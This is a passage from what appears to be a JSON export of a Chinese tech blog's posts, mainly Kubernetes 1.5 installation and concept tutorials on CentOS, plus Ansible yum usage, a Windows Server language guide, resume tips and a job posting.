etcdctl mk /atomic.io/network/config &apos;{&quot;Network&quot;:&quot;192.0.0.0/16&quot;}&apos;查看配置 [root@k8s-master ~]# etcdctl get /atomic.io/network/config {&quot;Network&quot;:&quot;192.0.0.0/16&quot;}重启 master 进程 systemctl enable flanneld.service systemctl start flanneld.service service docker restart systemctl restart kube-apiserver.service systemctl restart kube-controller-manager.service systemctl restart kube-scheduler.service重启 node 进程 systemctl enable flanneld.service systemctl start flanneld.service service docker restart systemctl restart kubelet.service systemctl restart kube-proxy.service完成安装[root@k8s-master ~]# kubectl --version Kubernetes v1.5.2 [root@k8s-master ~]# kubectl get nodes NAME STATUS AGE k8s-nodea Ready 16m k8s-nodeb Ready 16m [root@k8s-master ~]#到此为止，我们就搭建了一个 k8s 集群了，不过这里有很多问题，比如没有配置 https，etcd 没有配置集群等。","categories":[],"tags":[{"name":"k8s","slug":"k8s","permalink":"https://awen.me/tags/k8s/"}]},{"title":"k8s 核心原理","slug":"k8s-核心原理","date":"2018-03-06T06:07:23.000Z","updated":"2021-02-26T06:05:29.275Z","comments":true,"path":"posts/5206.html","link":"","permalink":"https://awen.me/posts/5206.html","excerpt":"","text":"K8s API server 原理分析k8s api server 核心功能是提供各种资源对的增删改查以及 watch 等 HTTP REST 接口，它是各个功能模块之间数据交互和通信的枢纽。 kubernetes api server 通过一个名为 kube-apiserver 的进程提供服务，它运行在 master 节点上，默认情况下 kube-apiserver 监听本机的8080端口，对应参数（–insecure-port） 提供 REST API 服务，不过为了安全考虑我们可以启用 HTTPS 安全端口（–secure-port=6443）启动安全机制，加强 REST AI 的 安全性。","categories":[],"tags":[{"name":"k8s","slug":"k8s","permalink":"https://awen.me/tags/k8s/"}]},{"title":"ansible YUM常用模块","slug":"ansible YUM 模块","date":"2018-03-06T05:33:17.000Z","updated":"2021-02-26T06:05:29.268Z","comments":true,"path":"posts/20376.html","link":"","permalink":"https://awen.me/posts/20376.html","excerpt":"yum 模块选项：","text":"yum 模块选项： config_file：yum的配置文件 disable_gpg_check：关闭gpg_check disablerepo：不启用某个源 enablerepo：启用某个源 list name：要进行操作的软件包的名字，也可以传递一个url或者一个本地的rpm包的路径 state # 状态（installted ,present&lt;安装&gt;，latest&lt;安装&gt;，absent&lt;删除&gt;） 安装软件➜ ~ ansible k8s -m yum -a &apos;name=vim state=present&apos;卸载➜ ~ ansible k8s -m yum -a &apos;name=vim state=absent&apos;","categories":[],"tags":[]},{"title":"windows server 2012 切换成英文模式","slug":"windows-server-2012-切换成英文模式","date":"2018-03-06T02:19:57.000Z","updated":"2021-02-26T06:05:29.293Z","comments":true,"path":"posts/28967.html","link":"","permalink":"https://awen.me/posts/28967.html","excerpt":"以 Windows server 2012 数据中心版为例： 1.首先，打开控制面板","text":"以 Windows server 2012 数据中心版为例： 1.首先，打开控制面板 2.找到语言，然后点击添加语言 3.在该对话框中搜索对应的语言，例如 English 4.然后选择英文的种类，例如加拿大 5.然后返回语言首页，点击选项 6.如果未安装语言则先下载安装，根据网速大约5分钟左右可以下载完成。 7.下载完成后点击选项-使用该语言 8.然后立即注销 9.然后重新连接即可。","categories":[],"tags":[{"name":"windows","slug":"windows","permalink":"https://awen.me/tags/windows/"}]},{"title":"k8s 基本概念","slug":"k8s-基本概念","date":"2018-03-05T01:56:58.000Z","updated":"2021-02-26T06:05:29.275Z","comments":true,"path":"posts/19759.html","link":"","permalink":"https://awen.me/posts/19759.html","excerpt":"Kubernetes 中的大部分概念如 Node、 Pod、 ReplicationController、 Service 等都可以看作一种“资源对象”， 几乎所有的资源对象都可以通过 Kubernetes 提供的 kubectl 工具（或者 API 编程调用） 执行 增、 删、 改、 查 等操作并将其保存 在 etcd 中持久化存储。","text":"Kubernetes 中的大部分概念如 Node、 Pod、 ReplicationController、 Service 等都可以看作一种“资源对象”， 几乎所有的资源对象都可以通过 Kubernetes 提供的 kubectl 工具（或者 API 编程调用） 执行 增、 删、 改、 查 等操作并将其保存 在 etcd 中持久化存储。 Master几乎所有的控制命令都是发给 Master 的,一般来说 Master 会单独部署在一个虚拟机或 X86服务器上 Master 的进程包括: Kubernetes API Server（ kube- apiserver）， 提供了 HTTP Rest 接口的关键服务进程， 是 Kubernetes 里所有资源的增、删、改、查等操作的唯一 入口，也是集群控制 的入口进程。 Kubernetes Controller Manager（ kube- controller- manager）， Kubernetes 里所有资源对象的自动化控制中心， 可以理解为资源对象的“大总管”。 Kubernetes Scheduler（ kube- scheduler）， 负责资源调度(Pod 调度)的程， 相当于公交公司的“ 调度室”。 其实 Master 节点上往往还启动了一个 etcd Server 进程， 因为 Kubernetes 里 的 所有 资源 对象 的 数据 全部 是 保存 在 etcd 中的。 Node除了 Master,Kubernetes 集群中的其他机器被称为 Node 节点. 每个 Node 节点上都运行着以下一组关键进程。 kubelet： 负责Pod 的创建 删除 启动 停止， 同时与 Master 节点密切协作， 实现集群管理的基本功能。 kube- proxy： 实现 Kubernetes Service 的通信与负载均衡机制的重要组件。 Docker Engine（ dockerDocker 引擎， 负责本机的容器创建和管理工作。 查看节点 [root@centos ~]# kubectl get node NAME STATUS AGE 127.0.0.1 Ready 2d查看节点详细信息,包括磁盘状态 [root@centos ~]# kubectl describe node 127.0.0.1 Name: 127.0.0.1 # 节点名称 Role: Labels: beta.kubernetes.io/arch=amd64 # 节点标签 beta.kubernetes.io/os=linux kubernetes.io/hostname=127.0.0.1 Taints: &lt;none&gt; CreationTimestamp: Fri, 02 Mar 2018 21:59:52 +0800 # 创建时间 Phase: Conditions: Type Status LastHeartbeatTime LastTransitionTime Reason Message ---- ------ ----------------- ------------------ ------ ------- OutOfDisk False Mon, 05 Mar 2018 10:24:15 +0800 Fri, 02 Mar 2018 21:59:52 +0800 KubeletHasSufficientDisk kubelet has sufficient disk space available # 磁盘信息 True 表示磁盘满了. MemoryPressure False Mon, 05 Mar 2018 10:24:15 +0800 Fri, 02 Mar 2018 21:59:52 +0800 KubeletHasSufficientMemory kubelet has sufficient memory available DiskPressure False Mon, 05 Mar 2018 10:24:15 +0800 Fri, 02 Mar 2018 21:59:52 +0800 KubeletHasNoDiskPressure kubelet has no disk pressure Ready True Mon, 05 Mar 2018 10:24:15 +0800 Sat, 03 Mar 2018 10:50:27 +0800 KubeletReady kubelet is posting ready status Addresses: 127.0.0.1,127.0.0.1,127.0.0.1 Capacity: alpha.kubernetes.io/nvidia-gpu: 0 cpu: 4 memory: 8002252Ki pods: 110 Allocatable: alpha.kubernetes.io/nvidia-gpu: 0 cpu: 4 memory: 8002252Ki pods: 110 System Info: Machine ID: 3ce150b846d1364ca00934cb4b7425e7 System UUID: 6648964A-8A37-49F8-AE2E-CD51D601E0A4 Boot ID: 6c79106a-2825-43e5-a49a-ce1837fed475 Kernel Version: 3.10.0-693.el7.x86_64 OS Image: CentOS Linux 7 (Core) Operating System: linux Architecture: amd64 Container Runtime Version: docker://1.12.6 Kubelet Version: v1.5.2 Kube-Proxy Version: v1.5.2 ExternalID: 127.0.0.1 Non-terminated Pods: (6 in total) Namespace Name CPU Requests CPU Limits Memory Requests Memory Limits --------- ---- ------------ ---------- --------------- ------------- default mysql-j6vpx 0 (0%) 0 (0%) 0 (0%) 0 (0%) default myweb-cwhhl 0 (0%) 0 (0%) 0 (0%) 0 (0%) default myweb-ljwtl 0 (0%) 0 (0%) 0 (0%) 0 (0%) default myweb-n0vrj 0 (0%) 0 (0%) 0 (0%) 0 (0%) default myweb-rnjq9 0 (0%) 0 (0%) 0 (0%) 0 (0%) default myweb-sgfhs 0 (0%) 0 (0%) 0 (0%) 0 (0%) Allocated resources: (Total limits may be over 100 percent, i.e., overcommitted. CPU Requests CPU Limits Memory Requests Memory Limits ------------ ---------- --------------- ------------- 0 (0%) 0 (0%) 0 (0%) 0 (0%) No events.PodPod 是 kubernetes 中 最基本的单位,每个 Pod 都有一个根容器叫 Pause 为什么需要根容器? 一组容器作为一个 Pod,无法对整体进行简单的判断并作出行动,比如一个容器死了是整体都死了吗?因此需要一个无关的根容器来代表整个容器的状态. Pod 的多个业务容器共享 Pause 的 IP, 并共享容器挂载的卷,既解决了通信问题又解决了共享问题 kubernetes 中,每个Pod都分配了一个唯一的 IP, 称之为 Pod-IP, 不同 Pod 和其他 pod 是可以通信的 在 Kubernetes 里， 一个计算资源进行配额限定需要设定以下两个参数。 Requests： 该资源的最小申请量，系统必须满足要求。 Limits： 该资源最大允许使用的量， 不能被突破， 当容器试图使用超过这个量的资源时， 可能会被 Kubernetes Kill 并重启。 通常来说我们会把 Requests 的值设置为一个比较小的数值,符合容器平时的工作负载情况下的资源需求,而 Limit 设置为峰值负载情况下资源占用的最大量,比如下面这段,表明 MYSQL 容器申请至少0.25个 CPU 一级64MiB 内存,在运行过程中容器所使用的资源配额为0.5个 CPU 以及128MiB 内存: spec: containers: - name: db image: mysql resources: requests: memory: &quot;64Mi&quot; cpu: &quot;250m&quot; limits: memory: &quot;128Mi&quot; cpu: &quot;500m&quot; Label一个 Label 是一个 key=value 的键值对,由用户自主设定, Label 可以附加到各种资源对象上,例如 Node、Pod、Service、RC 等，一个资源对象可以定义任意数量的 Label，同一个 Label 也可以被添加到任意数量的资源对象上去，Label 通常在资源对象定义时确定，也可以在对象创建后动态添加或删除。 Label 定义后，可以通过 Label Selector 查询和筛选拥有某些 Label 的资源对象。查询类似 SQL的 where 查询条件： name = redis-slave 匹配name等于 redis-slave 的资源对象。 env ！= production 匹配不具有标签 env=production 的资源对象， 比如 env=test 就满足此条件。 name in (redis-slave，redis-master) 匹配所有包含 redis-slave 和 redis-master 的资源对象。 name notin (php-frontend)，匹配所有不具有标签 name=php-frontend 的资源对象 多个表达式可以组合实现，需要用”,” 分割，几个条件之间是 “AND” 的关系 name= redis- slave, env!= production name notin (php- frontend), env!= productionLabel 选择器的使用场景： kube-controller 进程通过资源对象 RC 定义标签来筛选要监控的副本数量，实现自动控制流程。 kube-proxy 进程通过 service 的标签选择器来选择对应的 Pod，自动建立每个 service 到对应 Pod的请求转发路由表，从而实现 service 的智能负载均衡机制。 通过对某些 Node 定义特定标签，并且在 Pod 定义文件中使用 NodeSelector 这种标签调度策略，kube-scheduler 进程可实现 Pod“定向调度”的特性。 多 label RCRC 定义了一个期望的场景，即声明某种 Pod 的副本数在任何时候都符合预期，其包括： 副本数 用于筛选的 Pod 和 标签选择器 当 Pod 副本数小于预期数量时，用于创建新 Pod 的模板 RC 提交到集群–Master Controller Manager 组件收到通知，定期巡检当前存活的目标 Pod，并确保目标 Pod 实力数量刚好等于此 RC 的预期值，如果多于 Pod 副本，就会停掉一些，否则会创建一些 Pod。 动态缩放rc [root@centos ~]# kubectl get rc NAME DESIRED CURRENT READY AGE mysql 1 1 1 2d myweb 5 5 5 1d [root@centos ~]# kubectl scale rc mysql --replicas=3 replicationcontroller &quot;mysql&quot; scaled [root@centos ~]# kubectl get rc NAME DESIRED CURRENT READY AGE mysql 3 3 1 2d myweb 5 5 5 1d [root@centos ~]#删除 RC 并不会影响通过该 RC 已经创建好的 Pod，为了删除所有 Pod，可以设置 replicas=0 然后更新该 RC，另外可以使用 stop 或 delete 删除 RC 和 RC 控制的全部 Pod。 Deployment从 k8s 1.2引入的新概念， 与RC 相似度90%，目的是为了更好的解决 Pod 的编排问题。Deployment 在内部使用了 Replica Set 来实现目的。 Deployment 相对于 RC 的一个最大的升级就是随时知道当前 Pod “部署”的进度 Deployment 的场景： 创建一个 DP 对象来生成对应的 Replica Set 并完成 Pod 副本的创建过程。 检查 DP 的状态来看部署动作是否完成。 更新 DP 以创建新的 Pod（比如镜像升级）。 如果当前 DP 不稳定，回滚到一个早先的 DP 版本。 挂起或恢复一个 DP 例子，tomcat-deployment.yaml apiVersion: extensions/v1beta1 kind: Deployment metadata: name: frontend spec: replicas: 1 selector: matchLabels: tier: frontend matchExpressions: - {key: tier,operator: In,values: [frontend]} template: metadata: labels: app: app-demo tier: frontend spec: containers: - name: tomcat-demo image: tomcat imagePullPolicy: IfNotPresent ports: - containerPort: 8080 然后在集群中创建 deployment [root@centos ~]# kubectl create -f tomcat-dp.yaml deployment &quot;frontend&quot; created然后查看 [root@centos ~]# kubectl get deployments NAME DESIRED CURRENT UP-TO-DATE AVAILABLE AGE frontend 1 1 1 1 2m其中 DESIRED 为 Pod 副本数量的期望值，即定义的 Replica。 CURRENT 为当前的 Replica 值，它会不断变化直到达到 DESIRED 值，表明整个部署过程完成。 UP-TO-DATA 最新版本的 Pod 的副本数量，在滚动升级过程中，有多少个 Pod 副本已经升级成功了。 AVAILABLE 当前集群中可用的 Pod 副本数量。 查看对应的 Replica Set [root@centos ~]# kubectl get rs NAME DESIRED CURRENT READY AGE frontend-141477217 1 1 1 11m查看 pods [root@centos ~]# kubectl get pods NAME READY STATUS RESTARTS AGE frontend-141477217-jcckp 1/1 Running 0 12mHPAHPA = Horizontal Pod Autoscaler 意思是横向自动扩容。 通过手工执行 kubectl scale 效率低，不符合自动化、智能化的定位。HPA 通过追踪分析 RC 控制的所有目标 Pod 的负载变化情况，来确定是否需要针对性的调整目标 Pod 的副本数，这是 HPA 的实现原理。 HPA 的Pod 负载度量指标: CPUutilizationPercentage，目标 Pod 所有副本自身 CPU 利用率的平均值。 引用程序自定义的度量指标，比如服务在每秒内的请求数(TPS 或 QPS) 例子 apiVersion: autoscaling/v1 kind: HorizontalPodAutoscaler metadata: name:php-apache namespace: default spec: maxReplicas: 10 minReplicas: 1 scaleTargetRef: kind: Deployment name: php-apache targetCPUUtilizationPercentage: 90 命令方式实现 kubectl autoscale deployment php- apache --cpu- percent= 90 --min= 1 --max= 10Service之前的 Pod RC 都是为服务做“嫁衣”的 k8s 定义了一个服务的访问入口地址，前端通过这个入口访问其背后的一组由 Pod 副本组成的集群，service 与后端 Pod 通过 label selector 来实现对接。 而 RC 的作用是保证 service 的服务能能力和服务质量能够始终处于预期的标准。 每个 Pod 都会被分配一个单独的 IP 地址，而且每个 Pod 都提供一个独立的 endpoint 以被客户端访问，现在多个 Pod 组成的集群提供服务，一般是需要部署一个负载均衡器实现转发。在 k8s 中，node 上的 kube-proxy 就是一个软件负载均衡器，它负责把对 service 的请求转发到后端的某个 Pod 实例上，部署实现服务的负载均衡与会话保持机制，每个 service 分配一个全局唯一的虚拟 IP 地址，这个虚拟 IP 被称为 cluster IP，其在 service 的整个生命周期内是不变的。 apiVersion: v1 kind: Service metadata: name: tomcat-service spec: ports: - port: 8080 selector: tier: frontend 这里的标签与之前创建的 Tomcat 对应，查看暴露的地址和端口 [root@centos ~]# kubectl get endpoints NAME ENDPOINTS AGE kubernetes 192.168.10.115:6443 2d mysql 172.17.0.3:3306 3m tomcat-service 172.17.0.2:8080 37s查看 service 的 cluster IP： [root@centos ~]# kubectl get svc tomcat-service -o yaml得到如下内容 apiVersion: v1 kind: Service metadata: creationTimestamp: 2018-03-05T06:46:41Z name: tomcat-service namespace: default resourceVersion: &quot;256242&quot; selfLink: /api/v1/namespaces/default/services/tomcat-service uid: f6544c3e-2040-11e8-b481-fa163eee21c2 spec: clusterIP: 10.254.1.165 ports: - port: 8080 protocol: TCP targetPort: 8080 selector: tier: frontend sessionAffinity: None type: ClusterIP status: loadBalancer: {}其中 targetPort 属性用来确定提供该服务的容器暴露(EXPOSE)的端口，而 port 则定义 service 的虚拟端口，因为前面 Tomcat 没有指定 targetport，则默认与 port 相同。 多端口问题 其样例： apiVersion: v1 kind: Service metadata: name: tomcat-service spec: ports: - port: 8080 name: service-port - port: 8005 name: shutdown-port selector: tier: frontend 为什么要给多端口命名，这就需要涉及 k8s 的服务发现了。 服务发现首先，每个 k8s 中的 service 都有一个唯一的 cluster IP 以及唯一的名字，而名字是由开发者自定义的，部署的时候也没必要改变，所以完全可以固定在配置中。 早期 k8s 采用 linux 环境变量的方式解决问题。 这种方式不太方便，后来 k8s 通过 ADD-On 增值包的方式引入了 DNS 系统，把服务名作为 DNS 域名。 外部系统访问 service 的问题 采用nodeport 访问最为直接，但是 nodeport 无法解决例如负载均衡的问题，需要有一个 load balancer Volume （存储卷）k8s 的 volume 是 Pod 中能够给多容器访问的共享目录，与 docker 的 volume 类似，但不等价。首先，k8s 的 volume 定义在 Pod 上，然后被一个 Pod 里的多个容器挂载到具体的文件目录下，其次，k8s 的 volume 与 Pod 的生命周期相同，但是与容器的生命周期不相关。最后，k8s 支持多种类型的 volume，例如 ceph 等分布式文件系统。 k8s 的 volume 类型有：emptyDir（初始为空的，用来存放一些临时文件）、hostPath（主机文件或目录，存放日子等需要永久保存的文件）、gcePersistentDisk（谷歌公有云的永久磁盘，数据不会被删除，但是有限制条件）、awsElasticBlockStore（与前者类似）、NFS、其他类型的（iscsi等）。 Persistent volume简称 PV，可以理解为 k8s 集群中的某个网络存储中对应的一块存储： PV 只能是网络存储，不属于任何 Node，但是可以在 Node 上访问。 PV 并不是定义在 Pod 上，而是独立在 Pod 之外。 PV 目前的类型有 GCE NFS RBD iSCSCI aswElasticBlockStore GlusterFS Namespace中文名命令空间，可以实现多租户的资源隔离，通过将集群内部的资源对象分配到不同的 namespace 中，形成逻辑上分组的不同项目、小组或用户组，便于不同分组在共享使用整个集群的资源的同时还能被分别管理。 默认会有一个 default 的 namespace。 [root@centos ~]# kubectl get namespaces NAME STATUS AGE default Active 2d kube-system Active 2d如果不特别指明，则创建的 Pod RC service 都会被分配到 default 中。 定义 namespace，创建一个 namespace-demo.yaml 的文件 apiVersion: v1 kind: Namespace metadata: name: development然后创建查看 namespace [root@centos ~]# kubectl create -f namespace-demo.yaml namespace &quot;development&quot; created [root@centos ~]# kubectl get namespaces NAME STATUS AGE default Active 2d development Active 4s kube-system Active 2d添加一个pod 的配置，直到其 namespace 为 development apiVersion: v1 kind: Pod metadata: name: busybox namespace: development spec: containers: - image: busybox command: - sleep - &quot;36000&quot; name: busybox 创建 [root@centos ~]# kubectl create -f busybox.yaml pod &quot;busybox&quot; created查看 [root@centos ~]# kubectl get pods NAME READY STATUS RESTARTS AGE frontend-141477217-jcckp 1/1 Running 0 1h mysql-7p27m 1/1 Running 0 42m myweb-0n7b9 1/1 Running 0 42m myweb-5dcff 1/1 Running 0 42m myweb-mbxk4 1/1 Running 0 42m myweb-md64b 1/1 Running 0 42m myweb-rkql9 1/1 Running 0 42m直接查看不显示，需要加参数 [root@centos ~]# kubectl get pods --namespace=development NAME READY STATUS RESTARTS AGE busybox 1/1 Running 0 57s","categories":[],"tags":[{"name":"k8s","slug":"k8s","permalink":"https://awen.me/tags/k8s/"}]},{"title":"简历应该怎么写？","slug":"简历应该怎么写？","date":"2018-03-03T11:03:13.000Z","updated":"2021-02-26T06:05:29.350Z","comments":true,"path":"posts/23172.html","link":"","permalink":"https://awen.me/posts/23172.html","excerpt":"又到了三月份了，求职者们拿到年终奖不满意的或者根本就没拿到年终奖的？没有升职加薪的，工作不满意的都开始准备跳槽了？ 最近我们部门也在招人，我收到了一批简历，发现有些工作 2 年的或是工作六七年的简历写的真的让人有种感觉，就这样也怪不得找不到工作！","text":"又到了三月份了，求职者们拿到年终奖不满意的或者根本就没拿到年终奖的？没有升职加薪的，工作不满意的都开始准备跳槽了？ 最近我们部门也在招人，我收到了一批简历，发现有些工作 2 年的或是工作六七年的简历写的真的让人有种感觉，就这样也怪不得找不到工作！ 下面我就简历的相关注意事项分享一些我自己的心得，主要针对互联网或 IT 从业者 简历内容1.简历内容应包含一些你必要的信息，比如姓名、联系方式、学历、取得的证书、工作经历、学习或培训经历。有些同学简历写完了连个联系方式都没有。 2.如果是刚毕业的，建议写上你在校学习的技术以及你自己做的一些东西，如果实在没有，写上自己的博客也是可以的，我的心得是在自己还不牛逼的时候多写写博客，记录下自己的学习心得，并经常更新，也是能够加分的，不管是你自己建的博客或是csdn、51cto博客这类都可以，至少让用人单位看到你是有不断学习的。 通常来说自己建的博客并且拥有自己的域名能够让用人部门直接感知到你是懂些技术的。 另外，如果你有一些开发经验或是参与一些开源项目，比如托管在 GitHub 可以写上你的GitHub 地址，加分；3.如果是有工作经历的，重点写上你的上一份工作内容以及在项目或部门担任的职位和负责的内容以及取得的成果。 4.简历尽量写下自己优秀的一面，突出自己的能力，简历就是你的宣传单，你见过广告商在自己的广告内容写自己非常差的一面吗？ 5.如果你的PPT 做的非常好，可以写上，但是不建议写上会熟练使用 office，此条仅针对技术岗，会熟练使用office与岗位不匹配，写他干嘛，并且会个office是最基础的东西了。 6.简历建议输出为 PDF 格式，因为可能查阅你简历的人使用的是其他操作系统或办公软件，不同的办公软件打开 Word 文档的字体和排版效果是不一样的。 7.经常使用谷歌搜索而不是百度，加分。 8.可以写上你最近在学或在看的技术书籍或培训。 9.如果你是转行的，参加过各种培训，比如某内的编程培训其实不建议写到简历，因为很多公司对于培训机构出来的水平都表示怀疑，会针对某些培训机构的简历直接不看，比如我之前单位的开发就说培训机构出来的学习能力都比较差，另外一方面是因为一些培训机构帮助学员在简历和项目经验上造假，培训机构的学生的简历项目几乎千篇一律都是一个项目经验。 一份简历不要投多个岗位，切记海投相同一份简历很可能适合 A 岗位，但是对于 B 岗位就不符合，因此要适当修改你的简历与目标岗位匹配，但是需要注意你真的是匹配而不是造假。 HR 或用人部门在看你简历的时候都会与目标岗位所需要的技术活岗位职责与你之前的工作经历进行比较，如果符合则会打电话邀请你面试，因此，如果你确定看好目前岗位，简历认真写好你的简历并确认你的能力或经验与目标岗位相符。 发送邮件注意事项1.HR 或用人部门可能每天会收到大量的简历，因此投递简历，主要是邮件发送简历时邮件标题建议写上你的姓名+学历+应聘岗位。 2.发送邮件时，建议检查一遍，千万不要出现下面这种情况： WTF,附件呢？ 这种哪怕后面在补上简历都直接 PASS。 面试1.面试互联网企业，不需要穿西服打领带以及其他面试须知，参考 网易校招播报 最后，祝你找到满意的工作。","categories":[],"tags":[]},{"title":"网易-杭研招聘售后技术岗","slug":"网易杭研招聘","date":"2018-03-03T10:56:44.000Z","updated":"2021-02-26T06:05:29.353Z","comments":true,"path":"posts/53845.html","link":"","permalink":"https://awen.me/posts/53845.html","excerpt":"岗位名称: 杭研云技术售后技术岗工作地点：杭州 滨江","text":"岗位名称: 杭研云技术售后技术岗工作地点：杭州 滨江 岗位描述1、致力于提升网易云基础服务用户服务体验，优化服务规范；渠道及相关业务部门的技术支持。2、在线解答和处理用户遇到的问题；响应、跟踪并解决客户在使用网易云基础服务（蜂巢）过程中的问题。3、对工作流程及产品和业务问题进行分类分析和总结，并能提出改善建议。4、总结客户反馈问题，及时发现产品缺陷，提交反馈报告。5、记录和累积日常问题和故障的处理流程和经验，并归纳形成产品服务知识库。6、网易云基础服务（蜂巢）产品的文档撰写。岗位要求1、本科及以上学历，计算机相关专业优先；2、逻辑思维能力强，具有优秀的分析解决问题能力和沟通协调能力；3、1-3年开发或者运维或者技术支持经验。熟悉云计算产品，掌握网络、数据存储等相关知识，有云计算相关工作经验者优先考虑4、具有较强的文字功底和语言表达能力，能够胜任文档的编写；5、责任心强，注重人际关系和团队协作；抗压性强，乐观，善于沟通； 所需技术 熟悉以下技术: Linux、Windows server系列、MySQL、MongoDB、Kubernetes 、Docker、NoSql、ELK、CDN、对象存储、Redis、Memcached、Kafka、消息队列能够熟练使用：SHELL、Python、Java、PHP、Go、C# 等开发语言中的任意一项编写代码。 福利 1.全额缴纳公积金+商业保险2.每年至少1次出国旅游3.年底双薪+季度奖金，至少16薪4.猪场食堂一天五餐免费吃5.每月团建活动 薪资 根据依能力自己和HR谈。 欢迎有识之士加入，简历可发送 hi@awen.me 如匹配，我可以内推 说明 1.请将简历输出为 PDF 格式2.邮件标题格式 姓名+学历+应聘岗位","categories":[],"tags":[]},{"title":"K8s 的环境安装","slug":"K8s-的环境安装","date":"2018-03-02T13:42:59.000Z","updated":"2021-02-26T06:05:29.251Z","comments":true,"path":"posts/26561.html","link":"","permalink":"https://awen.me/posts/26561.html","excerpt":"安装 k8s在 centos 7 上 直接运行 yum -y install etcd kubernetesKubernetes 依赖 Etcd 服务来维护所有主节点的状态。 系统自带的etcd 版本是3.2.11 kubernetes 的版本是 1.5.2","text":"安装 k8s在 centos 7 上 直接运行 yum -y install etcd kubernetesKubernetes 依赖 Etcd 服务来维护所有主节点的状态。 系统自带的etcd 版本是3.2.11 kubernetes 的版本是 1.5.2 测试状态 [root@centos ~]# curl 127.0.0.1:8080 { &quot;paths&quot;: [ &quot;/api&quot;, &quot;/api/v1&quot;, &quot;/apis&quot;, &quot;/apis/apps&quot;, &quot;/apis/apps/v1beta1&quot;, &quot;/apis/authentication.k8s.io&quot;, &quot;/apis/authentication.k8s.io/v1beta1&quot;, &quot;/apis/authorization.k8s.io&quot;, &quot;/apis/authorization.k8s.io/v1beta1&quot;, &quot;/apis/autoscaling&quot;, &quot;/apis/autoscaling/v1&quot;, &quot;/apis/batch&quot;, &quot;/apis/batch/v1&quot;, &quot;/apis/batch/v2alpha1&quot;, &quot;/apis/certificates.k8s.io&quot;, &quot;/apis/certificates.k8s.io/v1alpha1&quot;, &quot;/apis/extensions&quot;, &quot;/apis/extensions/v1beta1&quot;, &quot;/apis/policy&quot;, &quot;/apis/policy/v1beta1&quot;, &quot;/apis/rbac.authorization.k8s.io&quot;, &quot;/apis/rbac.authorization.k8s.io/v1alpha1&quot;, &quot;/apis/storage.k8s.io&quot;, &quot;/apis/storage.k8s.io/v1beta1&quot;, &quot;/healthz&quot;, &quot;/healthz/ping&quot;, &quot;/healthz/poststarthook/bootstrap-controller&quot;, &quot;/healthz/poststarthook/extensions/third-party-resources&quot;, &quot;/healthz/poststarthook/rbac/bootstrap-roles&quot;, &quot;/logs&quot;, &quot;/metrics&quot;, &quot;/swaggerapi/&quot;, &quot;/ui/&quot;, &quot;/version&quot; ] }修改配置文件修改 # vim /etc/sysconfig/docker OPTIONS=&apos;--selinux-enabled=false --insecure-registry gcr.io&apos;修改 k8s apiserver 的配置文件 vim /etc/kubernetes/apiserver把 KUBE_ADMISSION_CONTROL=&quot;--admission-control=NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ServiceAccount,ResourceQuota&quot;中的 ServiceAccount 删掉。 启动服务1.设置为开机自启动 systemctl enable docker systemctl enable etcd systemctl enable kube-apiserver systemctl enable kube-controller-manager systemctl enable kube-scheduller systemctl enable kube-scheduler systemctl enable kubelet systemctl enable kube-proxy 2.启动 systemctl start docker systemctl start etcd systemctl start kube-apiserver systemctl start kube-controller-manager systemctl start kube-scheduller systemctl start kube-scheduler systemctl start kubelet systemctl start kube-proxy至此，一个单机版的k8s 集群就安装好了。 1.查看版本 kubectl version输出 [root@centos ~]# kubectl version Client Version: version.Info{Major:&quot;1&quot;, Minor:&quot;5&quot;, GitVersion:&quot;v1.5.2&quot;, GitCommit:&quot;269f928217957e7126dc87e6adfa82242bfe5b1e&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2017-07-03T15:31:10Z&quot;, GoVersion:&quot;go1.7.4&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;} Server Version: version.Info{Major:&quot;1&quot;, Minor:&quot;5&quot;, GitVersion:&quot;v1.5.2&quot;, GitCommit:&quot;269f928217957e7126dc87e6adfa82242bfe5b1e&quot;, GitTreeState:&quot;clean&quot;, BuildDate:&quot;2017-07-03T15:31:10Z&quot;, GoVersion:&quot;go1.7.4&quot;, Compiler:&quot;gc&quot;, Platform:&quot;linux/amd64&quot;}2.查看服务 [root@centos ~]# kubectl get service NAME CLUSTER-IP EXTERNAL-IP PORT(S) AGE kubernetes 10.254.0.1 &lt;none&gt; 443/TCP 12h [root@centos ~]# kubectl describe services kubernetes Name: kubernetes Namespace: default Labels: component=apiserver provider=kubernetes Selector: &lt;none&gt; Type: ClusterIP IP: 10.254.0.1 Port: https 443/TCP Endpoints: 192.168.10.115:6443 Session Affinity: ClientIP No events.定义 MYSQL RC 配置我们创建一个 mysql-rc.yaml 的文件，内容如下： apiVersion: v1 kind: ReplicationController # 副本控制器 RC metadata: name: mysql # RC名称，全局唯一 spec: replicas: 1 # Pod副本期待数量 selector: app: mysql # 符合目标 Pod拥有此标签 template: # 根据此模板创建 Pod 的副本（实例） metadata: labels: app: mysql # Pod 副本拥有的标签，对应 RC 的Selector spec: containers: # Pod 内容的定义部分 - name: mysql #容器的名称 image: mysql #容器对应的 Docker Image ports: - containerPort: 3306 # 容器暴露的端口号 env: # 注入到容器的环境变量 - name: MYSQL_ROOT_PASSWORD value: &quot;123456&quot;说明 kind 用来表示此资源对象的类型 spec 定义 RC 的相关属性，比如spec.selector 是 RC 的 Pod 标签选择器，即表示监控和管理这些标签的pod实例。 replicas = 1 表示只能运行一个mysql Pod 实例，当Pod 数量小于replicas 时，RC会根据spec.template 一节中定义的 Pod 来生成新的Pod实例 spec.template.labels 指定了该pod的标签，需要注意这里的app 必须与selector中的app相同，否则无法创建匹配label的pod 创建好 mysql-rc.yaml 文件以后，为了将它发布到 k8s 集群中，我们在 Master 节点执行命令： kubectl create -f mysql-rc.yaml提示如下 [root@centos ~]# kubectl create -f mysql-rc.yaml replicationcontroller &quot;mysql&quot; created提示如下错误请注意yaml 文件的格式是否正确以及配置参数是否输入正确 error: error validating &quot;mysql-rc.yaml&quot;: error validating data: kind not set; if you choose to ignore these errors, turn validation off with --validate=false查看 RC [root@centos ~]# kubectl get rc NAME DESIRED CURRENT READY AGE mysql 1 1 0 1m查看 Pod [root@centos ~]# kubectl get pods NAME READY STATUS RESTARTS AGE mysql-cvg6c 0/1 ContainerCreating 0 3m我们看到一个名为 mysql-xxxx的 Pod 实例，这是 k8s 根据 mysql 的这个 RC 文件的定义自动创建的 Pod。 由于其创建需要一些时间，因此我们一开始看到的 Pod 状态是 Pending，待最终完成会被更新为 Running 但是我们这边看到的状态是 ContainerCreating ,我们执行 [root@centos ~]# kubectl describe pod mysql Name: mysql-cvg6c 